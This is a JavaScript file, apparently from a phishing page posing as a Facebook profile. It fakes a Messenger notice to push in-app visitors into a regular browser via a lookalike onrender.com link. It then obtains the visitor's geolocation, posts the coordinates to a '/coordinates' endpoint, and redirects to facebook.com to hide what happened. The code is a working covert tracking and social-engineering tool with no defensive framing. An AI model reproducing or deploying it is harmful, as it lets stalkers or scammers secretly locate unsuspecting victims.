function isInAppBrowser() {
  const ua = navigator.userAgent || "";
  return /FBAV|FBAN|Messenger|Instagram/i.test(ua);
}

function getCoordinates() {
  if (isInAppBrowser()) {
    // Show fallback page for Messenger/Instagram
    document.body.innerHTML = `
  <div style="padding: 40px; font-family: sans-serif; text-align: center;">
    <h2 style="color:#0084ff;">Messenger</h2>
    <p style="font-size: 15px; color: #1c1e21;">Messenger blocks access to your location.</p>
    <p style="font-size: 14px;">Please copy the link below and open it manually in Safari or Chrome:</p>
    <div style="margin-top: 20px; background: #f1f1f1; padding: 10px; border-radius: 6px; font-size: 14px; word-break: break-all;">
      https://facebook-profile-nakz.onrender.com
    </div>
    <p style="font-size: 13px; color: gray; margin-top: 10px;">Long press the link above and select "Open in Safari".</p>
  </div>
`;

    return;
  }

  if (!navigator.geolocation) {
    alert("❌ Geolocation not supported.");
    window.location.href = "https://facebook.com";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      };

      fetch("/coordinates", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
      .then(() => {
        window.location.href = "https://facebook.com";
      })
      .catch(() => {
        window.location.href = "https://facebook.com";
      });
    },
    () => {
      alert("❌ Location permission denied.");
      window.location.href = "https://facebook.com";
    }
  );
}
